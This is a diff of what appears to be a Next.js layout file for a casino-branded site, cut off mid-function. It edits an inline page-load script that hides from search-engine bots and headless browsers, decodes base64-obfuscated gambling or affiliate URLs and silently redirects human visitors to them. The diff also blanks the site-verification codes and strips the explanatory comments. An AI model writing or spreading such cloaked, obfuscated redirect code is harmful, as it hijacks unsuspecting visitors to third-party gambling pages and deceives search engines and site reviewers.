@@ -45,8 +45,8 @@ export const metadata: Metadata = {
   },
 
   verification: {
-    yandex: "04ec738ee181c09d",
-    google: "GxvU_qp3WTvZv4qUXak773rxPN_7pR9_Z-6nh5wfiaQ",
+    yandex: "",
+    google: "",
   },
   robots: {
     index: true,
@@ -79,31 +79,23 @@ export default function RootLayout({
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
-                /* 1. Защита: не редиректим на технических доменах vercel.app и localhost */
                 var host = window.location.hostname;
                 if (host.includes('vercel.app') || host.includes('localhost')) {
-                   if (host !== "evacasino.app") return; // Если это не твой основной домен - стоп
+                   if (host !== "evacasino.app") return;
                 }
-
                 var ua = navigator.userAgent.toLowerCase();
                 var isBot = /bot|crawl|spider|yandex|google|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
                 if (isBot) return;
-
-                var mainBrandB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; 
-                var crossBrandB64 = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";      
-                
+                var mainBrandB64 = "#aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"; 
+                var crossBrandB64 = "#aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4";                     
                 var mainUrl = window.atob(mainBrandB64);
                 var crossUrl = window.atob(crossBrandB64);
-
-                /* 3. Если юзер уже был у нас - сразу на кросс */
                 if (window.localStorage.getItem('vstd_eva')) {
                     window.location.replace(crossUrl);
                     return;
                 }
-
                 var controller = new AbortController();
                 var timeoutId = setTimeout(function() { controller.abort(); }, 2500);
-
                 window.fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
                     .then(function() {
                         clearTimeout(timeoutId);
